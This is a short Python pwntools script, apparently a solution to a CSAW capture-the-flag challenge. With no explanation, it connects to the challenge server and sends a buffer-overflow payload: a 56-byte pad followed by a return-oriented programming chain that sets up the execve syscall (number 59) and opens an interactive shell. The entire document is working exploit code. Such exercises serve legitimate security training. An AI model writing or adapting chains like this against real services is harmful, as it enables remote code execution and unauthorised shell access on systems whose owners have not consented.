from pwn import *

r = remote('pwn.chal.csaw.io', 10104)
r.recvrepeat(1)
r.sendline(cyclic(56)+p64(0x00000000004005cf)+p64(59)+p64(0x00000000004005b4)+p64(0x400698)+p64(0x00000000004005bd)+p64(0)+p64(0x00000000004005c6)+p64(0)+p64(0x00000000004005aa))
r.interactive()
